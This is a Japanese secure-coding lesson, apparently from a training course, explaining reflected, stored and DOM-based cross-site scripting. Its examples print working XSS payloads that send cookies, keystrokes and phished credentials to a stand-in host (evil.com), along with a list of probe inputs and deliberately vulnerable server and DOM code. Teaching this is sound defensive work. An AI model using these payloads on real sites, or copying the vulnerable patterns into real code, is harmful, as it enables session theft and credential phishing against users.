# XSS攻撃を理解しよう

## メタ情報

```yaml
mission: "SQLインジェクション攻撃を阻止しよう"
step: 1
subStep: 4
title: "XSS攻撃を理解しよう"
itemType: LESSON
estimatedMinutes: 25
noiseLevel: MINIMAL
roadmap:
  skill: "セキュアコーディング"
  category: "セキュリティ"
  target_level: "L1"
```

---

## ストーリー

> 高橋さんが別の画面を開いた。
>
> 「SQLインジェクションだけじゃない。もう1つ、今回のログで気になるパターンがある」
>
> 画面には、掲示板の投稿データが表示されている。
>
> ```html
> <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
> ```
>
> 「これは......投稿に JavaScript が埋め込まれている？」
>
> 「XSS――クロスサイトスクリプティングだ。この投稿を見た他のユーザーのブラウザで
> このスクリプトが実行されて、Cookieが攻撃者のサーバーに送信される。
> セッションを乗っ取られる可能性がある」

---

## XSSとは

**XSS（Cross-Site Scripting）** は、Webページに悪意のあるスクリプトを注入し、他のユーザーのブラウザ上で実行させる攻撃です。

### 攻撃の流れ

```
1. 攻撃者がスクリプトを含むデータを送信
2. サーバーがそのデータをエスケープせずにHTMLに埋め込む
3. 被害者がそのページにアクセス
4. ブラウザがスクリプトを実行
5. Cookie、セッション、個人情報が攻撃者に送信される
```

---

## XSSの3つのタイプ

### 1. 反射型XSS（Reflected XSS）

ユーザーの入力がそのままレスポンスに反映される場合に発生します。

```
攻撃の流れ:
攻撃者 → 悪意のあるURLを作成 → 被害者にメールで送信
被害者 → URLをクリック → サーバーが入力をそのまま返す → スクリプト実行
```

```typescript
// 脆弱な検索ページ
app.get('/search', (req, res) => {
  const keyword = req.query.q;
  res.send(`<h1>検索結果: ${keyword}</h1>`);
  // keyword に <script>alert('XSS')</script> が入ると実行される
});
```

攻撃URL:
```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

### 2. 格納型XSS（Stored XSS）

悪意のあるスクリプトがデータベースに保存され、他のユーザーがそのデータを閲覧するたびに実行されます。

```
攻撃の流れ:
攻撃者 → 掲示板にスクリプト入りの投稿を送信
サーバー → データベースに保存
被害者A → 掲示板を閲覧 → スクリプト実行
被害者B → 掲示板を閲覧 → スクリプト実行
（閲覧者全員が被害を受ける）
```

```typescript
// 脆弱なコメント表示
app.get('/comments', async (req, res) => {
  const comments = await db.getComments();
  let html = '<div class="comments">';
  for (const comment of comments) {
    html += `<div class="comment">
      <strong>${comment.author}</strong>
      <p>${comment.body}</p>
    </div>`;
    // comment.body に <script> タグが含まれていると実行される
  }
  html += '</div>';
  res.send(html);
});
```

**格納型XSSは反射型より危険です。** 攻撃者がURLを配布する必要がなく、そのページを見る全てのユーザーが被害を受けます。

### 3. DOM-based XSS

サーバーを経由せず、クライアント側のJavaScriptがDOMを操作する過程で発生します。

```html
<!-- 脆弱なクライアント側コード -->
<script>
  // URLのハッシュフラグメントをそのまま表示
  const name = document.location.hash.substring(1);
  document.getElementById('greeting').innerHTML = 'こんにちは、' + name + 'さん';
</script>
```

攻撃URL:
```
https://example.com/page#<img src=x onerror="alert('XSS')">
```

サーバーのログには残らないため、検出が困難です。

---

## XSSで何ができるのか

### 1. セッションハイジャック

```javascript
// Cookieを盗んで攻撃者のサーバーに送信
new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
```

### 2. フィッシング

```javascript
// 偽のログインフォームを表示して、入力された認証情報を盗む
document.body.innerHTML = `
  <div style="text-align:center;margin-top:100px">
    <h2>セッションが切れました。再度ログインしてください。</h2>
    <form action="https://evil.com/phish" method="POST">
      <input name="email" placeholder="メールアドレス"><br>
      <input name="password" type="password" placeholder="パスワード"><br>
      <button type="submit">ログイン</button>
    </form>
  </div>
`;
```

### 3. キーロガー

```javascript
// ユーザーのキー入力を全て記録して送信
document.addEventListener('keypress', function(e) {
  new Image().src = 'https://evil.com/log?key=' + e.key;
});
```

### 4. ページの改ざん

```javascript
// ページの内容を改ざん
document.querySelector('h1').textContent = 'このサイトはハッキングされました';
```

---

## XSSの見分け方

### 危険な入力パターン

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
```

### 脆弱なコードパターン

```typescript
// innerHTML に未検証の値を代入
element.innerHTML = userInput;              // 危険

// document.write に未検証の値を使用
document.write(userInput);                  // 危険

// サーバー側でエスケープせずにHTMLを構築
res.send(`<p>${userInput}</p>`);            // 危険

// テンプレートエンジンでエスケープを無効化
// EJS: <%- userInput %>                    // 危険（<%= はエスケープされる）
// Pug: !{userInput}                        // 危険（#{} はエスケープされる）
```

---

## XSSの3タイプ比較

| 特性 | 反射型 | 格納型 | DOM-based |
|------|--------|--------|-----------|
| スクリプトの保存先 | URLパラメータ | データベース | クライアント側 |
| サーバー経由 | する | する | しない |
| 影響範囲 | URLをクリックした人 | ページを閲覧した全員 | URLにアクセスした人 |
| 検出の容易さ | 中 | 高 | 低 |
| 危険度 | 中 | 高 | 中 |

---

## まとめ

| ポイント | 内容 |
|----------|------|
| XSSとは | 悪意のあるスクリプトを他のユーザーのブラウザで実行させる攻撃 |
| 3つのタイプ | 反射型、格納型、DOM-based |
| 被害 | セッション乗っ取り、フィッシング、キーロガー、ページ改ざん |
| 原因 | ユーザー入力をエスケープせずにHTMLに出力している |

### チェックリスト

- [ ] XSSの3つのタイプを区別できる
- [ ] 格納型XSSが最も危険な理由を説明できる
- [ ] XSSで実行可能な攻撃の種類を理解した
- [ ] 脆弱なコードパターンを見分けられる

---

## 次のステップへ

XSSの仕組みを学びました。
次のセクションでは、**CSRF（クロスサイトリクエストフォージェリ）** とその他の攻撃手法を学びます。

Step 1の攻撃手法の全体像を完成させましょう。

---

*推定読了時間: 25分*
